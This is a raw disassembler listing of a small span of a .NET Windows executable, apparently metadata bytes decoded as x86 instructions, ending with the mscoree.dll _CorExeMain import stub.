  40c99e:	12 81 85 0e 11 81    	adc    -0x7eeef17b(%ecx),%al
  40c9a4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c9a5:	06                   	push   %es
  40c9a6:	00 03                	add    %al,(%ebx)
  40c9a8:	0e                   	push   %cs
  40c9a9:	0e                   	push   %cs
  40c9aa:	0e                   	push   %cs
  40c9ab:	0e                   	push   %cs
  40c9ac:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9b1:	1c 07                	sbb    $0x7,%al
  40c9b3:	00 01                	add    %al,(%ecx)
  40c9b5:	12 41 12             	adc    0x12(%ecx),%al
  40c9b8:	81 81 04 07 02 0a 02 	addl   $0x6071002,0xa020704(%ecx)
  40c9bf:	10 07 06 
  40c9c2:	12 81 b5 12 81 b9    	adc    -0x467eed4b(%ecx),%al
  40c9c8:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40c9ce:	0e                   	push   %cs
  40c9cf:	02 05 20 00 12 81    	add    0x81120020,%al
  40c9d5:	b9 05 20 00 12       	mov    $0x12002005,%ecx
  40c9da:	81 bd 05 20 00 12 81 	cmpl   $0x2004c181,0x12002005(%ebp)
  40c9e1:	c1 04 20 
  40c9e4:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c9e7:	04 07                	add    $0x7,%al
  40c9e9:	02 02                	add    (%edx),%al
  40c9eb:	02 03                	add    (%ebx),%al
  40c9ed:	20 00                	and    %al,(%eax)
  40c9ef:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c9f2:	02 18                	add    (%eax),%bl
  40c9f4:	02 09                	add    (%ecx),%cl
  40c9f6:	07                   	pop    %es
  40c9f7:	04 1d                	add    $0x1d,%al
  40c9f9:	12 41 08             	adc    0x8(%ecx),%al
  40c9fc:	12 41 0e             	adc    0xe(%ecx),%al
  40c9ff:	0a 07                	or     (%edi),%al
  40ca01:	04 12                	add    $0x12,%al
  40ca03:	81 b5 08 12 81 b9 0e 	xorl   $0x1100c0e,-0x467eedf8(%ebp)
  40ca0a:	0c 10 01 
  40ca0d:	01 15 12 81 d1 01    	add    %edx,0x1d18112
  40ca13:	1e                   	push   %ds
  40ca14:	00 12                	add    %dl,(%edx)
  40ca16:	35 05 0a 01 12       	xor    $0x12010a05,%eax
  40ca1b:	81 c1 0c 10 01 01    	add    $0x101100c,%ecx
  40ca21:	1e                   	push   %ds
  40ca22:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40ca28:	1e                   	push   %ds
  40ca29:	00 03                	add    %al,(%ebx)
  40ca2b:	07                   	pop    %es
  40ca2c:	01 0e                	add    %ecx,(%esi)
  40ca2e:	05 00 00 12 81       	add    $0x81120000,%eax
  40ca33:	d5 05                	aad    $0x5
  40ca35:	00 01                	add    %al,(%ecx)
  40ca37:	0e                   	push   %cs
  40ca38:	1d 1c 0b 07 05       	sbb    $0x5070b1c,%eax
  40ca3d:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40ca42:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40ca47:	20 02                	and    %al,(%edx)
  40ca49:	0e                   	push   %cs
  40ca4a:	08 08                	or     %cl,(%eax)
  40ca4c:	06                   	push   %es
  40ca4d:	07                   	pop    %es
  40ca4e:	02 02                	add    (%edx),%al
  40ca50:	11 81 55 05 20 02    	adc    %eax,0x2200555(%ecx)
  40ca56:	0e                   	push   %cs
  40ca57:	0e                   	push   %cs
  40ca58:	0e                   	push   %cs
  40ca59:	05 20 00 11 81       	add    $0x81110020,%eax
  40ca5e:	55                   	push   %ebp
  40ca5f:	05 00 00 12 81       	add    $0x81120000,%eax
  40ca64:	e5 06                	in     $0x6,%eax
  40ca66:	20 01                	and    %al,(%ecx)
  40ca68:	01 12                	add    %edx,(%edx)
  40ca6a:	81 e5 06 20 01 02    	and    $0x2012006,%ebp
  40ca70:	11 81 ed 11 07 05    	adc    %eax,0x50711ed(%ecx)
  40ca76:	12 81 b5 15 12 31    	adc    0x311215b5(%ecx),%al
  40ca7c:	01 0e                	add    %ecx,(%esi)
  40ca7e:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40ca84:	0e                   	push   %cs
  40ca85:	05 15 12 31 01       	add    $0x1311215,%eax
  40ca8a:	0e                   	push   %cs
  40ca8b:	05 20 00 1d 13       	add    $0x131d0020,%eax
  40ca90:	00 06                	add    %al,(%esi)
  40ca92:	00 02                	add    %al,(%edx)
  40ca94:	0e                   	push   %cs
  40ca95:	0e                   	push   %cs
  40ca96:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40ca9b:	1d 12 45 08 12       	sbb    $0x12084512,%eax
  40caa0:	45                   	inc    %ebp
  40caa1:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40caa6:	45                   	inc    %ebp
  40caa7:	05 20 00 11 81       	add    $0x81110020,%eax
  40caac:	f1                   	int1
  40caad:	09 00                	or     %eax,(%eax)
  40caaf:	02 02                	add    (%edx),%al
  40cab1:	11 81 f1 11 81 f1    	adc    %eax,-0xe7eee0f(%ecx)
  40cab7:	07                   	pop    %es
  40cab8:	20 03                	and    %al,(%ebx)
  40caba:	01 02                	add    %eax,(%edx)
  40cabc:	0e                   	push   %cs
  40cabd:	10 02                	adc    %al,(%edx)
  40cabf:	06                   	push   %es
  40cac0:	00 01                	add    %al,(%ecx)
  40cac2:	01 12                	add    %edx,(%edx)
  40cac4:	81 f9 06 07 02 12    	cmp    $0x12020706,%ecx
  40caca:	81 85 02 08 20 03 01 	addl   $0x111c0e01,0x3200802(%ebp)
  40cad1:	0e 1c 11 
  40cad4:	82 01 06             	addb   $0x6,(%ecx)
  40cad7:	07                   	pop    %es
  40cad8:	02 12                	add    (%edx),%dl
  40cada:	81 85 0e 06 20 01 12 	addl   $0xe858112,0x120060e(%ebp)
  40cae1:	81 85 0e 
  40cae4:	07                   	pop    %es
  40cae5:	20 02                	and    %al,(%edx)
  40cae7:	12 81 85 0e 02 12    	adc    0x12020e85(%ecx),%al
  40caed:	07                   	pop    %es
  40caee:	06                   	push   %es
  40caef:	12 20                	adc    (%eax),%ah
  40caf1:	0e                   	push   %cs
  40caf2:	08 12                	or     %dl,(%edx)
  40caf4:	80 c9 15             	or     $0x15,%cl
  40caf7:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40cafd:	12 20                	adc    (%eax),%ah
  40caff:	10 10                	adc    %dl,(%eax)
  40cb01:	01 01                	add    %eax,(%ecx)
  40cb03:	15 12 31 01 1e       	adc    $0x1e013112,%eax
  40cb08:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40cb0e:	1e                   	push   %ds
  40cb0f:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cb12:	01 12                	add    %edx,(%edx)
  40cb14:	20 05 20 01 02 13    	and    %al,0x13020120
  40cb1a:	00 03                	add    %al,(%ebx)
  40cb1c:	07                   	pop    %es
  40cb1d:	01 1c 05 00 00 12 82 	add    %ebx,-0x7dee0000(,%eax,1)
  40cb24:	05 07 20 01 12       	add    $0x12012007,%eax
  40cb29:	82 09 1d             	orb    $0x1d,(%ecx)
  40cb2c:	05 06 20 01 12       	add    $0x12012006,%eax
  40cb31:	82 0d 0e 06 00 01 1c 	orb    $0x1c,0x100060e
  40cb38:	12 82 0d 08 00 01    	adc    0x100080d(%edx),%al
  40cb3e:	12 82 0d 11 82 15    	adc    0x1582110d(%edx),%al
  40cb44:	09 00                	or     %eax,(%eax)
  40cb46:	02 12                	add    (%edx),%dl
  40cb48:	82 19 11             	sbbb   $0x11,(%ecx)
  40cb4b:	82 1d 0e 1c 00 05 12 	sbbb   $0x12,0x5001c0e
  40cb52:	82 25 11 82 29 0e 15 	andb   $0x15,0xe298211
  40cb59:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cb5f:	0d 12 82 0d 15       	or     $0x150d8212,%eax
  40cb64:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cb6a:	19 17                	sbb    %edx,(%edi)
  40cb6c:	15 12 55 01 15       	adc    $0x15015512,%eax
  40cb71:	12 59 0a             	adc    0xa(%ecx),%bl
  40cb74:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40cb77:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40cb7d:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cb82:	0e                   	push   %cs
  40cb83:	0b 00                	or     (%eax),%eax
  40cb85:	01 15 12 55 01 13    	add    %edx,0x13015512
  40cb8b:	00 12                	add    %dl,(%edx)
  40cb8d:	82 25 03 06 13 00 13 	andb   $0x13,0x130603
  40cb94:	15 12 59 0a 12       	adc    $0x120a5912,%eax
  40cb99:	5d                   	pop    %ebp
  40cb9a:	1c 12                	sbb    $0x12,%al
  40cb9c:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cba1:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cba6:	0e                   	push   %cs
  40cba7:	17                   	pop    %ss
  40cba8:	20 0a                	and    %cl,(%edx)
  40cbaa:	01 13                	add    %edx,(%ebx)
  40cbac:	00 13                	add    %dl,(%ebx)
  40cbae:	01 13                	add    %edx,(%ebx)
  40cbb0:	02 13                	add    (%ebx),%dl
  40cbb2:	03 13                	add    (%ebx),%edx
  40cbb4:	04 13                	add    $0x13,%al
  40cbb6:	05 13 06 13 07       	add    $0x7130613,%eax
  40cbbb:	13 08                	adc    (%eax),%ecx
  40cbbd:	13 09                	adc    (%ecx),%ecx
  40cbbf:	05 07 01 12 82       	add    $0x82120107,%eax
  40cbc4:	2d 07 20 03 01       	sub    $0x1032007,%eax
  40cbc9:	0e                   	push   %cs
  40cbca:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cbcf:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cbd5:	06                   	push   %es
  40cbd6:	12 81 2d 12 82 39    	adc    0x3982122d(%ecx),%al
  40cbdc:	12 82 3d 12 82 41    	adc    0x4182123d(%edx),%al
  40cbe2:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cbe7:	20 01                	and    %al,(%ecx)
  40cbe9:	01 11                	add    %edx,(%ecx)
  40cbeb:	82 4d 06 20          	orb    $0x20,0x6(%ebp)
  40cbef:	01 01                	add    %eax,(%ecx)
  40cbf1:	11 82 51 05 20 00    	adc    %eax,0x200551(%edx)
  40cbf7:	12 82 55 0b 20 03    	adc    0x3200b55(%edx),%al
  40cbfd:	01 12                	add    %edx,(%edx)
  40cbff:	39 12                	cmp    %edx,(%edx)
  40cc01:	82 55 11 82          	adcb   $0x82,0x11(%ebp)
  40cc05:	59                   	pop    %ecx
  40cc06:	08 20                	or     %ah,(%eax)
  40cc08:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cc0e:	08 1a                	or     %bl,(%edx)
  40cc10:	07                   	pop    %es
  40cc11:	0a 12                	or     (%edx),%dl
  40cc13:	81 2d 12 82 39 1d 05 	subl   $0x41821205,0x1d398212
  40cc1a:	12 82 41 
  40cc1d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cc22:	82 3d 1d 05 1d 05 1d 	cmpb   $0x1d,0x51d051d
  40cc29:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cc2e:	12 81 71 08 12 81    	adc    -0x7eedf78f(%ecx),%al
  40cc34:	71 08                	jno    0x40cc3e
  40cc36:	08 04 07             	or     %al,(%edi,%eax,1)
  40cc39:	02 02                	add    (%edx),%al
  40cc3b:	08 0e                	or     %cl,(%esi)
  40cc3d:	07                   	pop    %es
  40cc3e:	06                   	push   %es
  40cc3f:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40cc44:	12 82 65 1d 05 08    	adc    0x8051d65(%edx),%al
  40cc4a:	05 07 07 02 12       	add    $0x12020707,%eax
  40cc4f:	82 65 1d 05          	andb   $0x5,0x1d(%ebp)
  40cc53:	0f 07                	sysret
  40cc55:	06                   	push   %es
  40cc56:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40cc5c:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40cc62:	05 08 20 02 01       	add    $0x1022008,%eax
  40cc67:	12 39                	adc    (%ecx),%bh
  40cc69:	11 82 6d 0c 07 04    	adc    %eax,0x4070c6d(%edx)
  40cc6f:	12 81 2d 1d 05 12    	adc    0x12051d2d(%ecx),%al
  40cc75:	82 69 1d 05          	subb   $0x5,0x1d(%ecx)
  40cc79:	00 00                	add    %al,(%eax)
  40cc7b:	00 a4 cc 00 00 00 00 	add    %ah,0x0(%esp,%ecx,8)
  40cc82:	00 00                	add    %al,(%eax)
  40cc84:	00 00                	add    %al,(%eax)
  40cc86:	00 00                	add    %al,(%eax)
  40cc88:	be cc 00 00 00       	mov    $0xcc,%esi
  40cc8d:	20 00                	and    %al,(%eax)
	...
  40cca3:	00 b0 cc 00 00 00    	add    %dh,0xcc(%eax)
	...
  40ccb1:	00 5f 43             	add    %bl,0x43(%edi)
  40ccb4:	6f                   	outsl  %ds:(%esi),(%dx)
  40ccb5:	72 45                	jb     0x40ccfc
  40ccb7:	78 65                	js     0x40cd1e
  40ccb9:	4d                   	dec    %ebp
  40ccba:	61                   	popa
  40ccbb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40ccc2:	72 65                	jb     0x40cd29
  40ccc4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40ccc8:	6c                   	insb   (%dx),%es:(%edi)
  40ccc9:	00 00                	add    %al,(%eax)
  40cccb:	00 00                	add    %al,(%eax)
  40cccd:	00 ff                	add    %bh,%bh
  40cccf:	25 00 20 40 00       	and    $0x402000,%eax
